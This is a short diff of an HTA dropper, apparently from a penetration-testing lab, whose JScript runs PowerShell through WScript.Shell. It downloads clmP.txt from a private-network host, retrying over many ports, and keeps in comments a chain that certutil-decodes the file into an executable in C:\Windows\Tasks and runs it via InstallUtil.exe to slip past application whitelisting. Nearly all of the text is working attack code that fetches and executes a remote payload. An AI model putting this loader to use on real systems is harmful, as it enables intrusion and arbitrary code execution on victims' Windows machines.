@@ -2,7 +2,15 @@
 <head>
 <script language="JScript">
 var shell = new ActiveXObject("WScript.Shell");
-var res = shell.Run("powershell iwr -uri http://192.168.45.187:8000/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;powershell certutil -decode C:\\Windows\\Tasks\\enc1.txt C:\\Windows\\Tasks\\enc1.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /U C:\\Windows\\Tasks\\enc1.exe");
+var res = shell.Run("powershell iwr -uri http://192.168.49.70:4444/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;")
+var res1 = shell.Run("powershell iwr -uri http://192.168.49.70/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;")
+var res2 = shell.Run("powershell iwr -uri http://192.168.49.70:8080/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;")
+var res3 = shell.Run("powershell iwr -uri http://192.168.49.70:8090/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;")
+var res4 = shell.Run("powershell iwr -uri http://192.168.49.70:443/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;")
+var res5 = shell.Run("powershell iwr -uri http://192.168.49.70:8000/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;")
+var res5 = shell.Run("powershell iwr -uri http://192.168.49.70:445/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;")
+var res5 = shell.Run("powershell iwr -uri http://192.168.49.70:8081/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;")
+/*var res = shell.Run("powershell iwr -uri http://192.168.49.70:8000/clmP.txt -outfile C:\\Windows\\Tasks\\enc1.txt;powershell certutil -decode C:\\Windows\\Tasks\\enc1.txt C:\\Windows\\Tasks\\enc1.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /U C:\\Windows\\Tasks\\enc1.exe");*/
 </script>
 </head>
 <body>
